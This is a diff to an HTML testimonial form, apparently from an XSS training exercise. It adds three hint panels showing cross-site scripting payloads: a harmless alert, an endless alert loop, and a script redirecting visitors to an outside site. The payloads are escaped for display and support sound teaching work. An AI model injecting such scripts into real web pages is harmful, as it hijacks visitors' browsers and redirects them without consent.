@@ -68,6 +68,7 @@
 		<div class="jumbotron">
 			<div class="container text-left">
 				<h2>Leave your testimonial!</h2>
+				<p>Your feedback is important to us, because our mission is to deliver the best product.</p>
 			</div>
 		</div>
 
@@ -85,8 +86,88 @@
 			  <label for="conf">Feedback:</label>
 			  <textarea class="form-control" rows="5" id="conf" name="conf"></textarea>
 			</div>
-			<button type="submit" class="btn btn-default">Submit</button>
+			<button type="submit" class="btn-lg btn-success" >Submit</button>
 		  </form>
-		</div>		
+		</div>
+
+
+		<div class="container">
+			<div class="panel-group" id="accordion">
+				<div class="panel panel-default">
+					<div class="panel-heading">
+						<div class="panel-title">
+							<a href="#collapse-1" data-toggle="collapse" data-parent="#accordion">
+								+ Hint 1
+							</a>
+						</div><!-- End panel title -->
+
+						<div id="collapse-1" class="panel-collapse collapse">
+							<div class="panel-body">
+								<ul class="list-group">
+									<li class="list-group-item "><code>&lt;script&gt;alert('This is an innofensive alert')&lt;&#47;script&gt;</code></li>
+								</ul>
+								<div class="alert alert-success alert-dismissable">
+  									<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
+  									This XSS attack is kind of safe to test.
+  								</div>
+							</div>
+						</div><!-- End Panel collapse -->						
+					</div>
+				</div>
+			</div>
+
+			<div class="panel-group" id="accordion2">
+				<div class="panel panel-default">
+					<div class="panel-heading">
+						<div class="panel-title">
+							<a href="#collapse-2" data-toggle="collapse" data-parent="#accordion2">
+								+ Hint 2
+							</a>
+						</div><!-- End panel title -->
+
+						<div id="collapse-2" class="panel-collapse collapse">
+							<div class="panel-body">
+								<ul class="list-group">
+									<li class="list-group-item "><code>&lt;script&gt;
+for(i=0;;i++)
+	alert('This is a bad alert')&lt;&#47;script&gt;</code></li>
+								</ul>
+								<div class="alert alert-warning alert-dismissable">
+  									<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
+  									This XSS attack is annoying (depending on the browser).
+  								</div>							
+							</div>
+						</div><!-- End Panel collapse -->	
+					</div>
+				</div>
+			</div>
+
+
+			<div class="panel-group" id="accordion3">
+				<div class="panel panel-default">
+					<div class="panel-heading">
+						<div class="panel-title">
+							<a href="#collapse-3" data-toggle="collapse" data-parent="#accordion3">
+								+ Hint 3
+							</a>
+						</div><!-- End panel title -->
+
+						<div id="collapse-3" class="panel-collapse collapse">
+							<div class="panel-body">
+								<ul class="list-group">
+									<li class="list-group-item "><code>&lt;script&gt;
+document.location = 'http://www.gsp.ro'
+&lt;&#47;script&gt;</code></li>
+								</ul>
+								<div class="alert alert-danger alert-dismissable">
+  									<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
+  									This XSS attack is potentially dangerous to test.
+  								</div>								
+							</div>
+						</div><!-- End Panel collapse -->						
+					</div>
+				</div>
+			</div>
+		</div>
 	</body>
 </html>
